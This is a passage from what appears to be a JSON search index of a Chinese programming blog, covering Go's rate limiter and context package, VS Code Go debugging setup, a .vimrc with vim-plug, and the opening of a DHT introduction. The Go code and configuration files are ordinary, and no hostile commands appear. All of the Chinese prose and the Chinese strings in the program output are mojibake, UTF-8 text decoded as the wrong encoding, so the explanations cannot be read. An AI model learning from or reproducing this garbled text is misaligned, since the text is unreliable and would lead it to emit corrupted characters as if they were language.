å¦‚æœnè¶…è¿‡äº†ä»¤ç‰Œæ± çš„å®¹é‡å¤§å°åˆ™æŠ¥é”™ã€‚\n\n - å¦‚æœContextè¢«å–æ¶ˆäº†åˆ™æŠ¥é”™ã€‚\n\n - å¦‚æœlimitçš„ç­‰å¾…æ—¶é—´è¶…è¿‡äº†Contextçš„è¶…æ—¶æ—¶é—´åˆ™æŠ¥é”™ã€‚\n\n\n```\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n\n\t\"golang.org/x/time/rate\"\n)\n\nfunc main() {\n\tl := rate.NewLimiter(1, 3)\n\n\tc, _ := context.WithCancel(context.TODO())\n\tfor {\n\t\tl.WaitN(c, 1)\n\t\tfmt.Println(time.Now().Format(\"04:05.000\"))\n\t}\n}\n\n\n39:58.446\n39:58.446\n39:58.446\n39:59.451\n40:00.451\n40:01.450\n40:02.450\n```\n\n\n\n\n### Reserve/ReserveN\n\nå½“æ²¡æœ‰å¯ç”¨äº‹ä»¶æ—¶è¿”å›å¯¹è±¡Reservation ï¼Œæ ‡è¯†è°ƒç”¨è€…éœ€è¦ç­‰å¤šä¹…æ‰èƒ½ç­‰åˆ°nä¸ªäº‹ä»¶å‘ç”Ÿ(æ„æ€å°±æ˜¯ç­‰å¤šä¹…ä»¤ç‰Œæ± ä¸­è‡³å°‘å«æœ‰nä¸ªä»¤ç‰Œ)ã€‚\n\nå¦‚æœReserveN ä¼ å…¥çš„nå¤§äºä»¤ç‰Œæ± çš„å®¹é‡bï¼Œé‚£ä¹ˆè¿”å›false.\n\nå¦‚æœå¸Œæœ›æ ¹æ®é¢‘ç‡é™åˆ¶ç­‰å¾…å’Œé™ä½äº‹ä»¶å‘ç”Ÿçš„é€Ÿåº¦è€Œä¸ä¸¢æ‰äº‹ä»¶ï¼Œå°±ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ã€‚\n\næˆ‘è®¤ä¸ºè¿™é‡Œè¦è¡¨è¾¾çš„æ„æ€å°±æ˜¯å¦‚æœäº‹ä»¶å‘ç”Ÿçš„é¢‘ç‡æ˜¯å¯ä»¥ç”±è°ƒç”¨è€…æ§åˆ¶çš„è¯ï¼Œå¯ä»¥ç”¨ReserveN æ¥æ§åˆ¶äº‹ä»¶å‘ç”Ÿçš„é€Ÿåº¦è€Œä¸ä¸¢æ‰äº‹ä»¶ã€‚å¦‚æœè¦ä½¿ç”¨contextçš„æˆªæ­¢æ—¥æœŸæˆ–cancelæ–¹æ³•çš„è¯ï¼Œä½¿ç”¨WaitNã€‚\n\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n\n\t\"golang.org/x/time/rate\"\n)\n\nfunc main() {\n\tl := rate.NewLimiter(1, 3)\n\n\tfor {\n\t\tr := l.ReserveN(time.Now(), 1)\n\t\ts := r.Delay()\n\t\ttime.Sleep(s)\n\t\tfmt.Println(s, time.Now().Format(\"04:05.000\"))\n\t}\n}\n\n\n\n0s 44:54.118\n0s 44:54.119\n0s 44:54.119\n999.857594ms 44:55.124\n994.670516ms 44:56.124\n994.778299ms 44:57.124\n994.763486ms 44:58.124\n```\n","tags":["golang"],"categories":["golang"]},{"title":"golang_contextåŒ…çš„ä»‹ç»å’Œä½¿ç”¨","url":"%2Fp%2F63c8f369.html","content":"\n\n\n\n### Contextä»‹ç»\nä¸€ä¸ªç½‘ç»œè¯·æ±‚Requestï¼Œæ¯ä¸ªRequestéƒ½éœ€è¦å¼€å¯ä¸€ä¸ªgoroutineåšä¸€äº›äº‹æƒ…ï¼Œè¿™äº›goroutineåˆå¯èƒ½ä¼šå¼€å¯å…¶ä»–çš„goroutineã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ç§å¯ä»¥è·Ÿè¸ªgoroutineçš„æ–¹æ¡ˆï¼Œæ‰å¯ä»¥è¾¾åˆ°æ§åˆ¶ä»–ä»¬çš„ç›®çš„ï¼Œè¿™å°±æ˜¯Goè¯­è¨€ä¸ºæˆ‘ä»¬æä¾›çš„Contextï¼Œç§°ä¹‹ä¸ºä¸Šä¸‹æ–‡éå¸¸è´´åˆ‡ï¼Œå®ƒå°±æ˜¯goroutineçš„ä¸Šä¸‹æ–‡ã€‚\n\n```\npackage main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tctx, cancel := context.WithCancel(context.Background())\n\tgo func(ctx context.Context) {\n\t\tfor {\n\t\t\tselect {\n\t\t\tcase <-ctx.Done():\n\t\t\t\tfmt.Println(\"ç›‘æ§é€€å‡ºï¼Œåœæ­¢äº†...\")\n\t\t\t\treturn\n\t\t\tdefault:\n\t\t\t\tfmt.Println(\"goroutineç›‘æ§ä¸­...\")\n\t\t\t\ttime.Sleep(2 * time.Second)\n\t\t\t}\n\t\t}\n\t}(ctx)\n\ttime.Sleep(10 * time.Second)\n\tfmt.Println(\"å¯ä»¥äº†ï¼Œé€šçŸ¥ç›‘æ§åœæ­¢\")\n\tcancel()\n\n\ttime.Sleep(5 * time.Second)\n}\n\n\ngoroutineç›‘æ§ä¸­...\ngoroutineç›‘æ§ä¸­...\ngoroutineç›‘æ§ä¸­...\ngoroutineç›‘æ§ä¸­...\ngoroutineç›‘æ§ä¸­...\nå¯ä»¥äº†ï¼Œé€šçŸ¥ç›‘æ§åœæ­¢\nç›‘æ§é€€å‡ºï¼Œåœæ­¢äº†...\n```\n\n\ncontext.Background() è¿”å›ä¸€ä¸ªç©ºçš„Contextï¼Œè¿™ä¸ªç©ºçš„Contextä¸€èˆ¬ç”¨äºæ•´ä¸ªContextæ ‘çš„æ ¹èŠ‚ç‚¹ã€‚ç„¶åæˆ‘ä»¬ä½¿ç”¨context.WithCancel(parent)å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªå¯å–æ¶ˆçš„å­Contextï¼Œç„¶åå½“ä½œå‚æ•°ä¼ ç»™goroutineä½¿ç”¨ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªå­Contextè·Ÿè¸ªè¿™ä¸ªgoroutineã€‚\n<!-- more -->\n\n\n\n### æ§åˆ¶å¤šä¸ªgorotuine\n\n```\npackage main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tctx, cancel := context.WithCancel(context.Background())\n\tgo watch(ctx, \"ç›‘æ§1\")\n\tgo watch(ctx, \"ç›‘æ§2\")\n\tgo watch(ctx, \"ç›‘æ§3\")\n\ttime.Sleep(10 * time.Second)\n\tfmt.Println(\"å¯ä»¥äº†ï¼Œé€šçŸ¥ç›‘æ§åœæ­¢\")\n\tcancel()\n\n\ttime.Sleep(5 * time.Second)\n}\nfunc watch(ctx context.Context, name string) {\n\tfor {\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\tfmt.Println(name, \"ç›‘æ§é€€å‡ºï¼Œåœæ­¢äº†...\")\n\t\t\treturn\n\t\tdefault:\n\t\t\tfmt.Println(name, \"goroutineç›‘æ§ä¸­...\")\n\t\t\ttime.Sleep(2 * time.Second)\n\t\t}\n\t}\n}\n\n\nç›‘æ§3 goroutineç›‘æ§ä¸­...\nç›‘æ§2 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§3 goroutineç›‘æ§ä¸­...\nç›‘æ§2 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§3 goroutineç›‘æ§ä¸­...\nç›‘æ§2 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§2 goroutineç›‘æ§ä¸­...\nç›‘æ§3 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§2 goroutineç›‘æ§ä¸­...\nç›‘æ§3 goroutineç›‘æ§ä¸­...\nå¯ä»¥äº†ï¼Œé€šçŸ¥ç›‘æ§åœæ­¢\nç›‘æ§3 ç›‘æ§é€€å‡ºï¼Œåœæ­¢äº†...\nç›‘æ§1 ç›‘æ§é€€å‡ºï¼Œåœæ­¢äº†...\nç›‘æ§2 ç›‘æ§é€€å‡ºï¼Œåœæ­¢äº†...\n\n```\n\n\nç¤ºä¾‹ä¸­å¯åŠ¨äº†3ä¸ªç›‘æ§goroutineè¿›è¡Œä¸æ–­çš„ç›‘æ§ï¼Œæ¯ä¸€ä¸ªéƒ½ä½¿ç”¨äº†Contextè¿›è¡Œè·Ÿè¸ªï¼Œå½“æˆ‘ä»¬ä½¿ç”¨cancelå‡½æ•°é€šçŸ¥å–æ¶ˆæ—¶ï¼Œè¿™3ä¸ªgoroutineéƒ½ä¼šè¢«ç»“æŸã€‚è¿™å°±æ˜¯Contextçš„æ§åˆ¶èƒ½åŠ›ï¼Œå®ƒå°±åƒä¸€ä¸ªæ§åˆ¶å™¨ä¸€æ ·ï¼ŒæŒ‰ä¸‹å¼€å…³åï¼Œæ‰€æœ‰åŸºäºè¿™ä¸ªContextæˆ–è€…è¡ç”Ÿçš„å­Contextéƒ½ä¼šæ”¶åˆ°é€šçŸ¥ï¼Œè¿™æ—¶å°±å¯ä»¥è¿›è¡Œæ¸…ç†æ“ä½œäº†ï¼Œæœ€ç»ˆé‡Šæ”¾goroutineï¼Œè¿™å°±ä¼˜é›…çš„è§£å†³äº†goroutineå¯åŠ¨åä¸å¯æ§çš„é—®é¢˜ã€‚\n\n\n### Context æ¥å£\n\n```\ntype Context interface {\n\tDeadline() (deadline time.Time, ok bool)\n\tDone() <-chan struct{}\n\tErr() error\n\tValue(key interface{}) interface{}\n}\n```\n\n\n* Deadlineæ–¹æ³•æ˜¯è·å–è®¾ç½®çš„æˆªæ­¢æ—¶é—´çš„æ„æ€ï¼Œç¬¬ä¸€ä¸ªè¿”å›å¼æ˜¯æˆªæ­¢æ—¶é—´ï¼Œåˆ°äº†è¿™ä¸ªæ—¶é—´ç‚¹ï¼ŒContextä¼šè‡ªåŠ¨å‘èµ·å–æ¶ˆè¯·æ±‚ï¼›ç¬¬äºŒä¸ªè¿”å›å€¼ok==falseæ—¶è¡¨ç¤ºæ²¡æœ‰è®¾ç½®æˆªæ­¢æ—¶é—´ï¼Œå¦‚æœéœ€è¦å–æ¶ˆçš„è¯ï¼Œéœ€è¦è°ƒç”¨å–æ¶ˆå‡½æ•°è¿›è¡Œå–æ¶ˆã€‚\n\n* Doneæ–¹æ³•è¿”å›ä¸€ä¸ªåªè¯»çš„chanï¼Œç±»å‹ä¸ºstruct{}ï¼Œæˆ‘ä»¬åœ¨goroutineä¸­ï¼Œå¦‚æœè¯¥æ–¹æ³•è¿”å›çš„chanå¯ä»¥è¯»å–ï¼Œåˆ™æ„å‘³ç€parent contextå·²ç»å‘èµ·äº†å–æ¶ˆè¯·æ±‚ï¼Œæˆ‘ä»¬é€šè¿‡Doneæ–¹æ³•æ”¶åˆ°è¿™ä¸ªä¿¡å·åï¼Œå°±åº”è¯¥åšæ¸…ç†æ“ä½œï¼Œç„¶åé€€å‡ºgoroutineï¼Œé‡Šæ”¾èµ„æºã€‚\n\n* Erræ–¹æ³•è¿”å›å–æ¶ˆçš„é”™è¯¯åŸå› ï¼Œå› ä¸ºä»€ä¹ˆContextè¢«å–æ¶ˆã€‚\n\n* Valueæ–¹æ³•è·å–è¯¥Contextä¸Šç»‘å®šçš„å€¼ï¼Œæ˜¯ä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ‰€ä»¥è¦é€šè¿‡ä¸€ä¸ªKeyæ‰å¯ä»¥è·å–å¯¹åº”çš„å€¼ï¼Œè¿™ä¸ªå€¼ä¸€èˆ¬æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚\n\n\n\n### Contextçš„ç»§æ‰¿è¡ç”Ÿ\n\n```\nfunc WithCancel(parent Context) (ctx Context, cancel CancelFunc)\nfunc WithDeadline(parent Context, deadline time.Time) (Context, CancelFunc)\nfunc WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)\nfunc WithValue(parent Context, key, val interface{}) Context\n```\n\n\n+ valueä¼ é€’æ•°æ®\n\n```\npackage main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n)\n\nvar key string = \"name\"\n\nfunc main() {\n\tctx, cancel := context.WithCancel(context.Background())\n\tvalueCtx := context.WithValue(ctx, key, \"ç›‘æ§1\")\n\tgo watch(valueCtx)\n\n\ttime.Sleep(10 * time.Second)\n\tfmt.Println(\"å¯ä»¥äº†ï¼Œé€šçŸ¥ç›‘æ§åœæ­¢\")\n\n\tcancel()\n\ttime.Sleep(5 * time.Second)\n}\nfunc watch(ctx context.Context) {\n\tfor {\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\tfmt.Println(ctx.Value(key), \"ç›‘æ§é€€å‡ºï¼Œåœæ­¢äº†...\")\n\t\t\treturn\n\t\tdefault:\n\t\t\tfmt.Println(ctx.Value(key), \"goroutineç›‘æ§ä¸­...\")\n\t\t\ttime.Sleep(2 * time.Second)\n\t\t}\n\t}\n}\n\n\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nå¯ä»¥äº†ï¼Œé€šçŸ¥ç›‘æ§åœæ­¢\nç›‘æ§1 ç›‘æ§é€€å‡ºï¼Œåœæ­¢äº†...\n```\n\n\n### Context ä½¿ç”¨åŸåˆ™\n\n* ä¸è¦æŠŠContextæ”¾åœ¨ç»“æ„ä½“ä¸­ï¼Œè¦ä»¥å‚æ•°çš„æ–¹å¼ä¼ é€’\n* ä»¥Contextä½œä¸ºå‚æ•°çš„å‡½æ•°æ–¹æ³•ï¼Œåº”è¯¥æŠŠContextä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ”¾åœ¨ç¬¬ä¸€ä½ã€‚\n* ç»™ä¸€ä¸ªå‡½æ•°æ–¹æ³•ä¼ é€’Contextçš„æ—¶å€™ï¼Œä¸è¦ä¼ é€’nilï¼Œå¦‚æœä¸çŸ¥é“ä¼ é€’ä»€ä¹ˆï¼Œå°±ä½¿ç”¨context.TODO\n* Contextçš„Valueç›¸å…³æ–¹æ³•åº”è¯¥ä¼ é€’å¿…é¡»çš„æ•°æ®ï¼Œä¸è¦ä»€ä¹ˆæ•°æ®éƒ½ä½¿ç”¨è¿™ä¸ªä¼ é€’\n* Contextæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå¯ä»¥æ”¾å¿ƒçš„åœ¨å¤šä¸ªgoroutineä¸­ä¼ é€’\n\n","tags":["golang"],"categories":["golang"]},{"title":"golang_ide_vscodeçš„ä½¿ç”¨è°ƒè¯•å’Œé—®é¢˜è§£å†³","url":"%2Fp%2F127812f2.html","content":"\n\n\n### å®‰è£… vscodeåçš„plugins:\n\n1. go\n2. vscode-icons\n3. code runner\n4. markdown preview github\n5. markdown auto-open\n6. vscode snippets æ¨¡æ¿æ–‡ä»¶: [https://github.com/Microsoft/vscode-go/blob/master/snippets/go.json](https://github.com/Microsoft/vscode-go/blob/master/snippets/go.json)\n7. theme molokai è‡ªå¸¦\n   \n\n<!-- more -->\n### vscodeå¢åŠ golang debugè°ƒè¯•:\n\n1. xcode-select --install\n\n2. é’¥åŒ™é“¾åˆ›å»ºè¯ä¹¦ dlv-cert\n   \n3. è¯ä¹¦ç­¾å\n\n```    \ncd $GOPATH/src/github.com/derekparker\n    \ngit clone https://github.com/derekparker/delve.git  //è°ƒè¯• golang\n    \ncd delve\n    \nCERT=dlv-cert make install\n```\n\n\n\n\n\n### æˆ‘çš„vscodeé…ç½®æ–‡ä»¶\n\n> setting.json\n\n```\n{\n    \"files.associations\": {\n        \"*.lua.txt\": \"lua\"\n    },\n    \"files.exclude\": {\n        \"**/.git\": true,\n        \"**/.svn\": true,\n        \"**/.hg\": true,\n        \"**/CVS\": true,\n        \"**/.DS_Store\": true,\n        \"**/*.meta\": true,\n    },\n    \"files.autoSave\": \"afterDelay\",\n    \"workbench.colorTheme\": \"Monokai\",\n    \"workbench.iconTheme\": \"vscode-icons\",\n    \"workbench.editor.enablePreview\": false,\n    \"editor.fontSize\": 14,\n    \"editor.minimap.enabled\": false,\n    \"editor.formatOnType\": true,\n    \"editor.formatOnSave\": true,\n    \"extensions.autoUpdate\": false,\n    \"extensions.ignoreRecommendations\": true,\n    \"window.zoomLevel\": 0,\n    \"luaide.scriptRoots\": [\n        \"/Users/liuwei/workspace/client3-5/Assets/Resources/Lua\"\n    ],\n    \"vim.disableAnnoyingNeovimMessage\": true,\n    \"go.useLanguageServer\": true,\n    \"go.docsTool\": \"gogetdoc\",\n    \"go.buildOnSave\": true,\n    \"go.lintOnSave\": true,\n    \"go.vetOnSave\": true,\n    \"go.buildFlags\": [],\n    \"go.lintFlags\": [],\n    \"go.vetFlags\": [],\n    \"go.coverOnSave\": false,\n    \"go.useCodeSnippetsOnFunctionSuggest\": false,\n    \"go.formatOnSave\": true,\n    \"go.formatTool\": \"goreturns\",\n    \"go.goroot\": \"/usr/local/Cellar/go/1.9.2/libexec\",\n    \"go.gopath\": \"/Users/liuwei/golang\",\n}\n\n```\n\n> launch.json\n\n```\n{\n    // ä½¿ç”¨ IntelliSense äº†è§£ç›¸å…³å±æ€§ã€‚ \n    // æ‚¬åœä»¥æŸ¥çœ‹ç°æœ‰å±æ€§çš„æè¿°ã€‚\n    // æ¬²äº†è§£æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®: https://go.microsoft.com/fwlink/?linkid=830387\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"name\": \"Launch\",\n            \"type\": \"go\",\n            \"request\": \"launch\",\n            \"mode\": \"debug\",\n            \"remotePath\": \"\",\n            \"port\": 2345,\n            \"host\": \"127.0.0.1\",\n            \"program\": \"${fileDirname}\",\n            \"env\": {},\n            \"args\": [],\n            \"showLog\": true\n        }\n    ]\n}\n```\n\n\n\n\n\n\n### vscode é‡åˆ°çš„é—®é¢˜\n\n+ flag provided but not defined: -goversion\n\nä¸€ä¸ªæ˜¯ç‰ˆæœ¬åŸå› , ä¸€ä¸ªæ˜¯vscodeä¹Ÿè¦ä¿®æ”¹é…ç½®gopath, å‘çˆ¹\n\n>Thank you, I was able to solve this by running brew uninstall --force go and then downloading the latest installer. Anyone who reads this and wants to use brew you could probably just do brew install go after the forced uninstall. I had to restart my terminal and Gogland after doing this.\n\n+ vscode not jump define\n\n```\n\"go.useLanguageServer\": true,\n\"go.docsTool\": \"gogetdoc\",\n```\n\n+ vscode could not launch process: exec: \"lldb-server\": executable file not found in $PATH\n\n```\nxcode-select --install\n```\n\n\n+ vscode jump slow\n\nå®‰è£…https://github.com/sourcegraph/go-langserver æºç å®‰è£… éœ€è¦ go install\n\n```\n\"go.useLanguageServer\": true,\n```\n\n\n+ vscode output window hide go\n\n~/.vscode/æ‰©å±•åŒ…/package.json æ‰¾åˆ°æ˜¾ç¤ºçš„\n\n```\n\"showOutput\": \"never\"\n```\n\n","tags":["golang"],"categories":["golang"]},{"title":"vimæ’ä»¶ç®¡ç†_vimrcé…ç½®","url":"%2Fp%2F1b9bff9b.html","content":"\n# 1. vim-plug å®‰è£…\n\n```bash\ncurl -fLo ~/.vim/autoload/plug.vim --create-dirs \\\n    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n\n# è¿›å…¥vim,  :PlugInstall æ‰§è¡Œå®‰è£…å‘½ä»¤\n```\n\n<!-- more -->\n\n# 2. æˆ‘çš„.vimrc\n\n```bash\n\" Plugin \ncall plug#begin()\nPlug 'tomasr/molokai' \"ä¸»é¢˜\nPlug 'ctrlpvim/ctrlp.vim' \"å¿«é€ŸæŸ¥æ–‡ä»¶\nPlug 'Shougo/neocomplete.vim' \"ä»£ç å®æ—¶æç¤º\nPlug 'majutsushi/tagbar' \"tagbar\nPlug 'scrooloose/nerdtree' \"å¯¼èˆªæ ‘\nPlug 'jistr/vim-nerdtree-tabs' \"å¯¼èˆªæ ‘æ’ä»¶\nPlug 'vim-airline/vim-airline' \"çŠ¶æ€æ \nPlug 'ervandew/supertab' \"supertab\nPlug 'SirVer/ultisnips' \"ä»£ç æ¨¡æ¿\nPlug 'Valloric/YouCompleteMe' \"tableè¡¥å…¨\nPlug 'easymotion/vim-easymotion' \"æé€Ÿè·³è½¬\ncall plug#end()\n\n\n\" mapping\nlet mapleader=\",\"\nset mouse=a \"å¯ä»¥ç”¨é¼ æ ‡æ‹–åŠ¨\nset clipboard=unnamed \"é¼ æ ‡é€‰ä¸­yå¤åˆ¶\n\n\n\" easymotion\nlet g:EasyMotion_smartcase = 1\nlet g:EasyMotion_startofline = 0 \" keep cursor column when JK motion\nnmap s <Plug>(easymotion-overwin-f)\nnmap s <Plug>(easymotion-overwin-f2)\nmap  / <Plug>(easymotion-sn)\nomap / <Plug>(easymotion-tn)\nmap  n <Plug>(easymotion-next)\nmap  N <Plug>(easymotion-prev)\nmap <Leader>j <Plug>(easymotion-j)\nmap <Leader>k <Plug>(easymotion-k)\nmap <Leader>w <Plug>(easymotion-w)\nmap <Leader>b <Plug>(easymotion-b)\n\n\n\n\" Color \nsyntax enable\nset t_Co=256\nlet g:rehash256 = 1\nlet g:molokai_original = 1\ncolorscheme molokai\n\n\" Ycm\n\"let g:ycm_server_use_vim_stdout = 1\n\"let g:ycm_server_log_level = 'debug'\n\" make YCM compatible with UltiSnips (using supertab)\nlet g:ycm_key_list_select_completion = ['<C-n>', '<Down>']\nlet g:ycm_key_list_previous_completion = ['<C-p>', '<Up>']\nlet g:SuperTabDefaultCompletionType = '<C-n>'\nlet g:UltiSnipsExpandTrigger = \"<tab>\"\nlet g:UltiSnipsJumpForwardTrigger = \"<tab>\"\nlet g:UltiSnipsJumpBackwardTrigger = \"<s-tab>\"\n\n\n\" Nerdtree\n\"autocmd vimenter * NERDTree \"è‡ªåŠ¨æ‰“å¼€Tree\n\"autocmd vimenter * Tagbar \"è‡ªåŠ¨æ‰“å¼€TagBar\nnmap <F7> :NERDTreeToggle<CR>\nnmap <F8> :TagbarToggle<CR>\nlet NERDTreeWinSize=20 \"è®¾ç½®nerdtreeå®½åº¦\nlet g:tagbar_width=20 \"è®¾ç½®å®½åº¦ï¼Œé»˜è®¤ä¸º40\n\"let g:nerdtree_tabs_open_on_console_startup=1 \"å¯åŠ¨æ‰“å¼€nerdtree\nlet g:neocomplete#enable_at_startup = 1 \"ä»£ç å®æ—¶æç¤º\n\"let NERDTreeQuitOnOpen=1 \"æ‰“å¼€æ–‡ä»¶åè‡ªåŠ¨å…³é—­çª—å£\n\n\" æ‰“å¼€NERDTree,å®šä½åˆ°å½“å‰æ–‡ä»¶\nnoremap <silent> <Leader>f :NERDTreeFind<cr> \n\"æ‰“å¼€tagbarçª—å£,è·³è½¬åè‡ªåŠ¨å…³é—­,qä¸è·³è½¬ç›´æ¥å…³é—­\nnoremap <silent> <Leader>g :TagbarOpen fjc<cr> \n\" NERDTree tab switch\nmap  <C-l> :tabn<CR>\nmap  <C-h> :tabp<CR>\nmap  <C-o> :tabnew<CR>\n\n\n\" config\nset tabstop=4                   \" è®¾å®štabé•¿åº¦ä¸º4\nset shiftwidth=4                \" ç¼©è¿›çš„ç©ºæ ¼æ•°ä¸º4\n\nfiletype off                    \" Reset filetype detection first ...\nfiletype plugin indent on       \" ... and enable filetype detection\nset nocompatible                \" Enables us Vim specific features\nset ttyfast                     \" Indicate fast terminal conn for faster \nset ttymouse=xterm2             \" Indicate terminal type for mouse codes\nset ttyscroll=3                 \" Speedup scrolling\nset laststatus=2                \" Show status line always\nset encoding=utf-8              \" Set default encoding to UTF-8\nset autoread                    \" Automatically read changed files\nset autoindent                  \" Enabile Autoindent\nset backspace=indent,eol,start  \" Makes backspace key more powerful.\nset incsearch                   \" Shows the match while typing\nset hlsearch                    \" Highlight found searches\nset noerrorbells                \" No beeps\nset number                      \" Show line numbers\nset showcmd                     \" Show me what I'm typing\nset noswapfile                  \" Don't use swapfile\nset nobackup                    \" Don't create annoying backup files\nset splitright                  \" Vertical windows should be split to right\nset splitbelow                  \" Horizontal windows should split to bottom\nset autowrite                   \" Automatically save before :next, :make etc.\nset hidden                      \" Buffer still exist if window is closed\nset fileformats=unix,dos,mac    \" Prefer Unix over Windows over OS 9 formats\nset noshowmatch                 \" Do not show matching brackets by flickering\nset noshowmode                  \" We show the mode with airline or lightline\nset ignorecase                  \" Search case insensitive...\nset smartcase                   \" but not it begins with upper case\nset completeopt=menu,menuone    \" Show popup menu, even if there is one entry\nset pumheight=10                \" Completion window max size\nset nocursorcolumn              \" Dont highlight column\nset nocursorline                \" Dont highlight cursor\nset lazyredraw                  \" Wait to redraw\nset cursorcolumn\n```\n\n\n\n# 3. vimé…ç½®\n\n### 3.1 vim æ‹·è´åˆ°ç³»ç»Ÿå‰ªè´´æ¿\n\n1. which vimå¯ä»¥çœ‹åˆ°å½“å‰ä½¿ç”¨çš„vimæ˜¯å“ªä¸ªï¼Œvim --versionå¯ä»¥çœ‹åˆ°å½“å‰ä½¿ç”¨çš„vimæ”¯æŒå“ªäº›featureï¼Œ'+'å‰ç¼€è¡¨ç¤ºæ‹¥æœ‰çš„featureï¼Œ'-'å‰ç¼€è¡¨ç¤ºæœªæ‹¥æœ‰ï¼›\n\n2. '+clipboard'æ˜¯æ”¯æŒä½¿ç”¨ç³»ç»Ÿå‰ªåˆ‡æ¿çš„featureï¼›å¦‚æœä½ å½“å‰ä½¿ç”¨çš„vimä¸æ”¯æŒclipboardï¼Œé‚£éœ€è¦brew upgrade vimè£…ä¸€ä¸ªæ–°çš„ï¼›\n\n3. å®‰è£…æ–°çš„ä»¥åï¼Œè¦æŠŠè¿™ä¸ªæ–°çš„vimè®¾ç½®ä¸ºé»˜è®¤vimï¼Œé€šå¸¸ä½¿ç”¨aliasè®¾ç½®ä¸€ä¸‹åˆ«åï¼Œæˆ–è€…é€šè¿‡ç¯å¢ƒå˜é‡è®¾ç½®ï¼Œæˆ–è€…åˆ æ‰æ—§çš„ï¼Œåšä¸ªè½¯è¿æ¥ï¼›\n\n4. ç¡®è®¤+clipboardä»¥åï¼Œåœ¨.vimrcæ–‡ä»¶ä¸­åŠ å…¥set clipboard=unamedï¼Œå°±å¯ä»¥åœ¨vimä¸­ä½¿ç”¨ç³»ç»Ÿå‰ªåˆ‡æ¿äº†\n\n\n","tags":["linux"],"categories":["vim"]},{"title":"dhtåˆ†å¸ƒå¼æ•£åˆ—è¡¨å’Œkadä»‹ç»","url":"%2Fp%2F2c46e603.html","content":"\n\n### 1. å¦‚ä½•å®ç°æ•£åˆ—è¡¨\n\n+ åœ¨æ•£åˆ—è¡¨è¿™ç§æ•°æ®ç»“æ„ä¸­ï¼Œä¼šåŒ…å« N ä¸ª bucketï¼ˆæ¡¶ï¼‰ã€‚å¯¹äºæŸä¸ªå…·ä½“çš„æ•£åˆ—è¡¨ï¼ŒNï¼ˆæ¡¶çš„æ•°é‡ï¼‰é€šå¸¸æ˜¯ã€å›ºå®šä¸å˜ã€‘çš„ã€‚äºæ˜¯å¯ä»¥å¯¹æ¯ä¸ªæ¡¶è¿›è¡Œç¼–å·ï¼Œä» 0 åˆ° N-1ã€‚\n\n+ â€œæ¡¶â€æ˜¯ç”¨æ¥å­˜å‚¨â€œé”®å€¼å¯¹â€çš„ï¼Œä½ å¯ä»¥æŠŠå®ƒé€šä¿—ç†è§£æˆä¸€ä¸ªåŠ¨æ€æ•°ç»„ï¼Œé‡Œé¢å¯ä»¥å­˜æ”¾ã€å¤šä¸ªã€‘â€œé”®å€¼å¯¹â€ã€‚\n\n+ å½“ä½¿ç”¨æŸä¸ª key è¿›è¡ŒæŸ¥æ‰¾ï¼Œä¼šå…ˆç”¨æŸä¸ªæ•£åˆ—å‡½æ•°è®¡ç®—è¿™ä¸ª key çš„æ•£åˆ—å€¼ã€‚å¾—åˆ°æ•£åˆ—å€¼é€šå¸¸æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œç„¶åç”¨æ•£åˆ—å€¼å¯¹ Nï¼ˆæ¡¶æ•°ï¼‰è¿›è¡Œâ€œå–æ¨¡â€è¿ç®—ï¼ˆé™¤æ³•æ±‚ä½™æ•°ï¼‰ï¼Œå°±å¯ä»¥ç®—å‡ºå¯¹åº”çš„æ¡¶ç¼–å·ã€‚ï¼ˆæ³¨ï¼šå–æ¨¡è¿ç®—æ˜¯æœ€å¸¸ç”¨çš„åšæ³•ï¼Œä½†ä¸æ˜¯å”¯ä¸€çš„åšæ³•ï¼‰\n\n<!-- more -->\n\n### 2. åˆ†å¸ƒå¼æ•£åˆ—è¡¨ DHT\n\n##### 2.1 P2P æŠ€æœ¯è·¯çº¿\n\n- ä¸­å¤®æœåŠ¡å™¨  Napster  ->å•ç‚¹æ•…éšœ\n- å¹¿æ’­   Gnutella æ—©æœŸç‰ˆæœ¬ ->å¹¿æ’­é£æš´\n- DHT\n\n##### 2.2 DHT éš¾ç‚¹\n\n- æ— ä¸­å¿ƒ \n\t\n\téœ€è¦æä¾›ä¸€ç³»åˆ—æœºåˆ¶æ¥å®ç°èŠ‚ç‚¹ä¹‹é—´çš„é€šè®¯ã€‚\n- æµ·é‡æ•°æ® 